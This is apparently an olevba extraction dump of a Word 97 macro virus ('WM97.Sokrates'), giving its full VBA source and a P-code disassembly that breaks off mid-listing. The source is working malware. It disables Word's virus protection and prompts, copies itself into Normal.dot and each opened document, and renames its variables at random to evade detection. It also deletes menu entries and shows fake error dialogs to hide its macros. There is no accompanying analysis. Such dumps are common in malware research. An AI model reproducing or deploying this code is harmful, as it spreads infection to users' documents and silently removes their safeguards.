olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.VMPCK1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.VMPCK1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO wt61je.bas 
in file: ./Virus.MSWord.VMPCK1 - OLE stream: 'Macros/VBA/wt61je'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub uf9196()

Randomize
On Error Resume Next

v1$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99) & "$"
v2$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99) & "$"
v3$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99) & "$"
v4$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99) & "$"
v5$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99)
v6$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99)
v7$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99)
v8$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99)
v9$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99)
v10$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 99) & Int(Rnd * 99)

wy29$ = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 999) & Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22)))
wk68$ = wy29$
ho67$ = Application.VBE.SelectedVBComponent.CodeModule.Name
po51$ = "c:\windows\system\win32sok.sys"
Set ze82 = ActiveDocument.VBProject.VBComponents
Set sq29 = NormalTemplate.VBProject.VBComponents

For i = 1 To ze82.Count
nn91 = ze82.Item(i).CodeModule.CountOfLines
If nn91 = 162 Then ki65 = 1
Next i

For i = 1 To sq29.Count
nn91 = sq29.Item(i).CodeModule.CountOfLines
If nn91 = 162 Then pk25 = 1
Next i

If ki65 = 0 Or pk25 = 0 Then Application.VBE.ActiveVBProject.VBComponents(ho67$).Export po51$

If pk25 = 0 Then
sq29.Import po51$
Application.OrganizerRename Source:=NormalTemplate.FullName, Name:=ho67$, Newname:=wk68$, Object:=wdOrganizerObjectProjectItems
With sq29.Item(wk68$).CodeModule
        .ReplaceLine 1, "Sub " & v10$ & "()"
        .ReplaceLine 17, v1$ & " = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 999) & Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22)))"
        .ReplaceLine 18, v2$ & " = " & v1$
        .ReplaceLine 19, v3$ & " = Application.VBE.SelectedVBComponent.CodeModule.Name"
        .ReplaceLine 20, v4$ & " = ""c:\windows\system\win32poly.sys"""
        .ReplaceLine 21, "Set " & v5$ & " = ActiveDocument.VBProject.VBComponents"
        .ReplaceLine 22, "Set " & v6$ & " = NormalTemplate.VBProject.VBComponents"
        .ReplaceLine 24, "For i = 1 To " & v5$ & ".Count"
        .ReplaceLine 25, v7$ & " = " & v5$ & ".Item(i).CodeModule.CountOfLines"
        .ReplaceLine 26, "If " & v7$ & " = 162 Then " & v8$ & " = 1"
        .ReplaceLine 29, "For i = 1 To " & v6$ & ".Count"
        .ReplaceLine 30, v7$ & " = " & v6$ & ".Item(i).CodeModule.CountOfLines"
        .ReplaceLine 31, "If " & v7$ & " = 162 Then " & v9$ & " = 1"
        .ReplaceLine 34, "If " & v8$ & " = 0 Or " & v9$ & " = 0 Then Application.VBE.ActiveVBProject.VBComponents(" & v3$ & ").Export " & v4$
        .ReplaceLine 36, "If " & v9$ & " = 0 Then"
        .ReplaceLine 37, v6$ & ".Import " & v4$
        .ReplaceLine 38, "Application.OrganizerRename Source:=NormalTemplate.FullName, Name:=" & v3$ & ", Newname:=" & v2$ & ", Object:=wdOrganizerObjectProjectItems"
        .ReplaceLine 39, "With " & v6$ & ".Item(" & v2$ & ").CodeModule"
        .ReplaceLine 68, "If " & v8$ & " = 0 Then"
        .ReplaceLine 69, v5$ & ".Import " & v4$
        .ReplaceLine 70, "Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=" & v3$ & ", Newname:=" & v2$ & ", Object:=wdOrganizerObjectProjectItems"
        .ReplaceLine 71, "With " & v5$ & ".Item(" & v2$ & ").CodeModule"
        .ReplaceLine 102, "Sub AutoClose()"
        .ReplaceLine 106, "Call " & v10$
    End With
    NormalTemplate.Save
End If

If ki65 = 0 Then
ze82.Import po51$
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=ho67$, Newname:=wk68$, Object:=wdOrganizerObjectProjectItems
With ze82.Item(wk68$).CodeModule
        .ReplaceLine 1, "Sub " & v10$ & "()"
        .ReplaceLine 17, v1$ & " = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 999) & Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22)))"
        .ReplaceLine 18, v2$ & " = " & v1$
        .ReplaceLine 19, v3$ & " = Application.VBE.SelectedVBComponent.CodeModule.Name"
        .ReplaceLine 20, v4$ & " = ""c:\windows\system\win32poly.sys"""
        .ReplaceLine 21, "Set " & v5$ & " = ActiveDocument.VBProject.VBComponents"
        .ReplaceLine 22, "Set " & v6$ & " = NormalTemplate.VBProject.VBComponents"
        .ReplaceLine 24, "For i = 1 To " & v5$ & ".Count"
        .ReplaceLine 25, v7$ & " = " & v5$ & ".Item(i).CodeModule.CountOfLines"
        .ReplaceLine 26, "If " & v7$ & " = 162 Then " & v8$ & " = 1"
        .ReplaceLine 29, "For i = 1 To " & v6$ & ".Count"
        .ReplaceLine 30, v7$ & " = " & v6$ & ".Item(i).CodeModule.CountOfLines"
        .ReplaceLine 31, "If " & v7$ & " = 162 Then " & v9$ & " = 1"
        .ReplaceLine 34, "If " & v8$ & " = 0 Or " & v9$ & " = 0 Then Application.VBE.ActiveVBProject.VBComponents(" & v3$ & ").Export " & v4$
        .ReplaceLine 36, "If " & v9$ & " = 0 Then"
        .ReplaceLine 37, v6$ & ".Import " & v4$
        .ReplaceLine 38, "Application.OrganizerRename Source:=NormalTemplate.FullName, Name:=" & v3$ & ", Newname:=" & v2$ & ", Object:=wdOrganizerObjectProjectItems"
        .ReplaceLine 39, "With " & v6$ & ".Item(" & v2$ & ").CodeModule"
        .ReplaceLine 68, "If " & v8$ & " = 0 Then"
        .ReplaceLine 69, v5$ & ".Import " & v4$
        .ReplaceLine 70, "Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=" & v3$ & ", Newname:=" & v2$ & ", Object:=wdOrganizerObjectProjectItems"
        .ReplaceLine 71, "With " & v5$ & ".Item(" & v2$ & ").CodeModule"
        .ReplaceLine 102, "Sub AutoOpen()"
        .ReplaceLine 106, "Call " & v10$
    End With
    ActiveDocument.SaveAs ActiveDocument.FullName
End If

End Sub

Sub AutoOpen()
On Error Resume Next
Application.ScreenUpdating = False: Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
Call uf9196
CommandBars("Format").Controls("Formatvorlage...").Delete
CommandBars("Tools").Controls("Vorlagen und Add-Ins...").Delete
If Hour(Now()) = Int(Rnd * 24) Then
    With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Heading = "-=[ WM97.Sokrates ]=-"
        .Text = "Greetz to Sokrates<LzØ>!" & Chr(13) & Chr(13) & "Jack Twoflower"
        .Animation = msoAnimationCheckingSomething
        .Show
    End With
End If
Application.ScreenUpdating = True: Application.DisplayAlerts = wdAlertsAll
End Sub

Sub ExtrasMakro()
Dim x
ReDim Combobox1__$(0)
Combobox1__$(0) = ""
ReDim Textbox1__$(0)
Textbox1__$(0) = ""
ReDim DropListBox2__$(0)
DropListBox2__$(0) = "Normal.dot (Globale Dokumentvorlage)"

WordBasic.BeginDialog 620, 280, "Makros"
    WordBasic.Text 7, 6, 93, 13, "Makro&name:", "Text3"
    WordBasic.ComboBox 7, 23, 435, 170, Combobox1__$(), "Combobox1"
    WordBasic.PushButton 470, 14, 137, 21, "&Ausführen", "Definierbar2"
    WordBasic.CancelButton 470, 38, 137, 21
    WordBasic.PushButton 470, 72, 137, 21, "&Schrittweise prüfen", "Definierbar3"
    WordBasic.PushButton 470, 96, 137, 21, "&Bearbeiten", "Definierbar4"
    WordBasic.PushButton 470, 130, 137, 21, "&Erstellen", "Definierbar5"
    WordBasic.PushButton 470, 154, 137, 21, "&Organisieren", "Definierbar6"
    WordBasic.PushButton 470, 178, 137, 21, "&Organisieren...", "Definierbar7"
    WordBasic.Text 7, 200, 93, 13, "Ma&kros in:", "Text1"
    WordBasic.DropListBox 90, 196, 354, 19, DropListBox2__$(), "Listbox2"
    WordBasic.Text 7, 222, 109, 13, "Beschreibung:", "Text2"
    WordBasic.TextBox 7, 235, 437, 38, Textbox1__$()
WordBasic.EndDialog
 
Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
x = WordBasic.Dialog.UserDialog(dlg)
Select Case x
    Case 0
        WordBasic.Cancel
    Case 1 To 6
        WordBasic.MsgBox "Nicht genug Arbeitsspeicher! Schließen Sie eine oder mehrere Anwendungen!", "WordBasic Fehler=7", 48
End Select
End Sub
Sub AnsichtCode()
apppath = UCase(Application.StartupPath)
MsgBox "Die erforderliche Datei 'Vba32.dll' im Verzeichnis """ & apppath & """ wurde nicht gefunden. Versuchen Sie die fehlende Datei erneut zu installieren!", 16, "Microsoft Word"
End Sub
Sub AnsichtVBCode()
apppath = UCase(Application.StartupPath)
MsgBox "Die erforderliche Datei 'Vba32.dll' im Verzeichnis """ & apppath & """ wurde nicht gefunden. Versuchen Sie die fehlende Datei erneut zu installieren!", 16, "Microsoft Word"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.VMPCK1
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/wt61je - 15643 bytes
' Line #0:
' 	FuncDefn (Sub uf9196())
' Line #1:
' Line #2:
' 	ArgsCall Read 0x0000 
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' Line #5:
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0063 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 "$"
' 	Concat 
' 	St v1$ 
' Line #6:
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0063 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 "$"
' 	Concat 
' 	St v2$ 
' Line #7:
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0063 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 "$"
' 	Concat 
' 	St v3$ 
' Line #8:
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0063 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitStr 0x0001 "$"
' 	Concat 
' 	St v4$ 
' Line #9:
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0063 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St v5$ 
' Line #10:
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0063 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St v6$ 
' Line #11:
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0063 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St v7$ 
' Line #12:
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0063 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St v8$ 
' Line #13:
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0063 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St v9$ 
' Line #14:
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0063 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0063 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St v10$ 
' Line #15:
' Line #16:
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St wy29$ 
' Line #17:
' 	Ld wy29$ 
' 	St wk68$ 
' Line #18:
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd SelectedVBComponent 
' 	MemLd CodeModule 
' 	MemLd New 
' 	St ho67$ 
' Line #19:
' 	LitStr 0x001E "c:\windows\system\win32sok.sys"
' 	St po51$ 
' Line #20:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set ze82 
' Line #21:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set sq29 
' Line #22:
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ze82 
' 	MemLd Count 
' 	For 
' Line #24:
' 	Ld i 
' 	Ld ze82 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nn91 
' Line #25:
' 	Ld nn91 
' 	LitDI2 0x00A2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ki65 
' 	EndIf 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld sq29 
' 	MemLd Count 
' 	For 
' Line #29:
' 	Ld i 
' 	Ld sq29 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nn91 
' Line #30:
' 	Ld nn91 
' 	LitDI2 0x00A2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St pk25 
' 	EndIf 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' Line #33:
' 	Ld ki65 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld pk25 
' 	LitDI2 0x0000 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld po51$ 
' 	Ld ho67$ 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' 	EndIf 
' Line #34:
' Line #35:
' 	Ld pk25 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	Ld po51$ 
' 	Ld sq29 
' 	ArgsMemCall Import 0x0001 
' Line #37:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ho67$ 
' 	ParamNamed New 
' 	Ld wk68$ 
' 	ParamNamed Newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #38:
' 	StartWithExpr 
' 	Ld wk68$ 
' 	Ld sq29 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #39:
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Sub "
' 	Ld v10$ 
' 	Concat 
' 	LitStr 0x0002 "()"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #40:
' 	LitDI2 0x0011 
' 	Ld v1$ 
' 	LitStr 0x0085 " = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 999) & Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22)))"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #41:
' 	LitDI2 0x0012 
' 	Ld v2$ 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld v1$ 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #42:
' 	LitDI2 0x0013 
' 	Ld v3$ 
' 	LitStr 0x0036 " = Application.VBE.SelectedVBComponent.CodeModule.Name"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #43:
' 	LitDI2 0x0014 
' 	Ld v4$ 
' 	LitStr 0x0024 " = "c:\windows\system\win32poly.sys""
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #44:
' 	LitDI2 0x0015 
' 	LitStr 0x0004 "Set "
' 	Ld v5$ 
' 	Concat 
' 	LitStr 0x0028 " = ActiveDocument.VBProject.VBComponents"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #45:
' 	LitDI2 0x0016 
' 	LitStr 0x0004 "Set "
' 	Ld v6$ 
' 	Concat 
' 	LitStr 0x0028 " = NormalTemplate.VBProject.VBComponents"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #46:
' 	LitDI2 0x0018 
' 	LitStr 0x000D "For i = 1 To "
' 	Ld v5$ 
' 	Concat 
' 	LitStr 0x0006 ".Count"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #47:
' 	LitDI2 0x0019 
' 	Ld v7$ 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld v5$ 
' 	Concat 
' 	LitStr 0x0020 ".Item(i).CodeModule.CountOfLines"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #48:
' 	LitDI2 0x001A 
' 	LitStr 0x0003 "If "
' 	Ld v7$ 
' 	Concat 
' 	LitStr 0x000C " = 162 Then "
' 	Concat 
' 	Ld v8$ 
' 	Concat 
' 	LitStr 0x0004 " = 1"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #49:
' 	LitDI2 0x001D 
' 	LitStr 0x000D "For i = 1 To "
' 	Ld v6$ 
' 	Concat 
' 	LitStr 0x0006 ".Count"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #50:
' 	LitDI2 0x001E 
' 	Ld v7$ 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld v6$ 
' 	Concat 
' 	LitStr 0x0020 ".Item(i).CodeModule.CountOfLines"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #51:
' 	LitDI2 0x001F 
' 	LitStr 0x0003 "If "
' 	Ld v7$ 
' 	Concat 
' 	LitStr 0x000C " = 162 Then "
' 	Concat 
' 	Ld v9$ 
' 	Concat 
' 	LitStr 0x0004 " = 1"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #52:
' 	LitDI2 0x0022 
' 	LitStr 0x0003 "If "
' 	Ld v8$ 
' 	Concat 
' 	LitStr 0x0008 " = 0 Or "
' 	Concat 
' 	Ld v9$ 
' 	Concat 
' 	LitStr 0x0037 " = 0 Then Application.VBE.ActiveVBProject.VBComponents("
' 	Concat 
' 	Ld v3$ 
' 	Concat 
' 	LitStr 0x0009 ").Export "
' 	Concat 
' 	Ld v4$ 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #53:
' 	LitDI2 0x0024 
' 	LitStr 0x0003 "If "
' 	Ld v9$ 
' 	Concat 
' 	LitStr 0x0009 " = 0 Then"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #54:
' 	LitDI2 0x0025 
' 	Ld v6$ 
' 	LitStr 0x0008 ".Import "
' 	Concat 
' 	Ld v4$ 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #55:
' 	LitDI2 0x0026 
' 	LitStr 0x0043 "Application.OrganizerRename Source:=NormalTemplate.FullName, Name:="
' 	Ld v3$ 
' 	Concat 
' 	LitStr 0x000B ", Newname:="
' 	Concat 
' 	Ld v2$ 
' 	Concat 
' 	LitStr 0x0027 ", Object:=wdOrganizerObjectProjectItems"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #56:
' 	LitDI2 0x0027 
' 	LitStr 0x0005 "With "
' 	Ld v6$ 
' 	Concat 
' 	LitStr 0x0006 ".Item("
' 	Concat 
' 	Ld v2$ 
' 	Concat 
' 	LitStr 0x000C ").CodeModule"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #57:
' 	LitDI2 0x0044 
' 	LitStr 0x0003 "If "
' 	Ld v8$ 
' 	Concat 
' 	LitStr 0x0009 " = 0 Then"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #58:
' 	LitDI2 0x0045 
' 	Ld v5$ 
' 	LitStr 0x0008 ".Import "
' 	Concat 
' 	Ld v4$ 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #59:
' 	LitDI2 0x0046 
' 	LitStr 0x0043 "Application.OrganizerRename Source:=ActiveDocument.FullName, Name:="
' 	Ld v3$ 
' 	Concat 
' 	LitStr 0x000B ", Newname:="
' 	Concat 
' 	Ld v2$ 
' 	Concat 
' 	LitStr 0x0027 ", Object:=wdOrganizerObjectProjectItems"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #60:
' 	LitDI2 0x0047 
' 	LitStr 0x0005 "With "
' 	Ld v5$ 
' 	Concat 
' 	LitStr 0x0006 ".Item("
' 	Concat 
' 	Ld v2$ 
' 	Concat 
' 	LitStr 0x000C ").CodeModule"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #61:
' 	LitDI2 0x0066 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #62:
' 	LitDI2 0x006A 
' 	LitStr 0x0005 "Call "
' 	Ld v10$ 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #63:
' 	EndWith 
' Line #64:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #65:
' 	EndIfBlock 
' Line #66:
' Line #67:
' 	Ld ki65 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #68:
' 	Ld po51$ 
' 	Ld ze82 
' 	ArgsMemCall Import 0x0001 
' Line #69:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ho67$ 
' 	ParamNamed New 
' 	Ld wk68$ 
' 	ParamNamed Newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #70:
' 	StartWithExpr 
' 	Ld wk68$ 
' 	Ld ze82 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #71:
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Sub "
' 	Ld v10$ 
' 	Concat 
' 	LitStr 0x0002 "()"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #72:
' 	LitDI2 0x0011 
' 	Ld v1$ 
' 	LitStr 0x0085 " = Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22))) & Int(Rnd * 999) & Chr(122 - (Int(Rnd * 22))) & Chr(122 - (Int(Rnd * 22)))"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #73:
' 	LitDI2 0x0012 
' 	Ld v2$ 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld v1$ 
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #74:
' 	LitDI2 0x0013 
' 	Ld v3$ 
' 	LitStr 0x0036 " = Application.VBE.SelectedVBComponent.CodeModule.Name"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #75:
' 	LitDI2 0x0014 
' 	Ld v4$ 
' 	LitStr 0x0024 " = "c:\windows\system\win32poly.sys""
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #76:
' 	LitDI2 0x0015 
' 	LitStr 0x0004 "Set "
' 	Ld v5$ 
' 	Concat 
' 	LitStr 0x0028 " = ActiveDocument.VBProject.VBComponents"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #77:
' 	LitDI2 0x0016 
' 	LitStr 0x0004 "Set "
' 	Ld v6$ 
' 	Concat 
' 	LitStr 0x0028 " = NormalTemplate.VBProject.VBComponents"
' 	Concat 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #78:
' 	LitDI2 0x0018 
' 	LitStr 0x000D "For i = 1 To "
' 	Ld v5$ 
